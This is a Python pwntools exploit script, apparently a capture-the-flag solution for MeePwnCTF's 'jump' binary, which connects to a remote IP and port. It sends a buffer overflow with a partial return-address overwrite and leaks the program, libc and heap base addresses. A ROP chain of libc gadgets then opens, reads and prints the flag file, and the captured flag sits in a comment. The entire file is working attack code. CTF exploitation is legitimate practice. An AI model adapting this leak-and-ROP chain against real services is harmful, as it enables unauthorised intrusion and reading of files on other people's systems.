__author__  = 'b1gtang'

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.arch='amd64'

r = None

def init(binary, host, port, R=True, E=False):
    global r

    if E: # or R:
        libc64 = './libc-2.27.so'
    else:
        libc64 = '/lib/x86_64-linux-gnu/libc.so.6'

    if R:
        r = remote(host, port)
    else:
        r = process(binary, env={'LD_PRELOAD':libc64})

    return ELF(binary), ELF(libc64)

def attach(addr):
    if addr <= 0x400000:
        addr = addr + 0x555555554000
    gdb.attach(r, gdbscript='set disassemble-next-line on\nb *0x%x' % addr)

def exploit(host):
    while True:
        #code, libc = init('./jump', '178.128.217.117', 31336, R=False)
        code, libc = init('./jump', '178.128.217.117', 31336)
        #attach(0xd12)
        r.recvuntil('Give me input:')
        r.sendline('a'*1016+'\xe0\x4c')

        try:
            r.recvuntil('a'*1016, timeout=2)
        except:
            print '1 stage failed'
            r.close()
            continue
        code.address = u64(r.recv(6).ljust(8, '\x00'))-0xce0
        log.info(hex(code.address))
        r.send(fit({0x3f8-0x130+8:code.address+0xce0},length=1016)+p64(code.address+0xcee))
        r.sendline('\xa8\x89')
        try:
            libc.address = u64(r.recv(6).ljust(8, '\x00'))-0x3ebcb0
            log.info(hex(libc.address))
        except:
            print '3 stage failed'
            r.close()
            continue

        #r.send(fit({0x3f8-0x130+8:code.address+0xce0},length=1016)+p64(code.address+0xcee))
        r.send(p64(code.address+0xce0)*127+p64(code.address+0xcee))
        r.sendline('\xa0\x89')
        heap = u64(r.recv(6).ljust(8, '\x00'))-0x1670
        log.info(hex(heap))
        #
        #attach(0xd12)
        r.send('/home/jump/flag\x00'+p64(code.address+0xd33)*125+p64(code.address+0xcee))
        try:
            p  = ''
            p += p64(libc.address + 0x28597)#pop rdi
            p += p64(heap+0x19a0)
            p += p64(libc.address + 0x1306d9)#pop rsi
            p += p64(0)
            p += p64(0)
            p += p64(libc.address+0x439c8)
            p += p64(2)
            p += p64(libc.address+0xe58e5)
            # read
            p += p64(libc.address + 0x28597)#pop rdi
            p += p64(3)
            p += p64(libc.address + 0x1306d9)#pop rsi
            p += p64(0x20)
            p += p64(heap+0x19a0)
            p += p64(libc.address+0x439c8)
            p += p64(0)
            p += p64(libc.address+0xe58e5)
            # puts
            p += p64(libc.address + 0x28597)#pop rdi
            p += p64(heap+0x19a0)
            p += p64(code.address+0x920)
        except:
            print '2 stage failed'
            r.close()
            continue
        r.sendline(p64(heap+0x19a0-0x10)+p+'y'*0x40)
        flag = r.recvline().strip('\n')
        print flag
        # MeePwnCTF{J4mp_J4mp_J4mp:v:v}
        break

if __name__ == '__main__':
    host = '127.0.0.1'
    exploit(host)
    r.interactive()
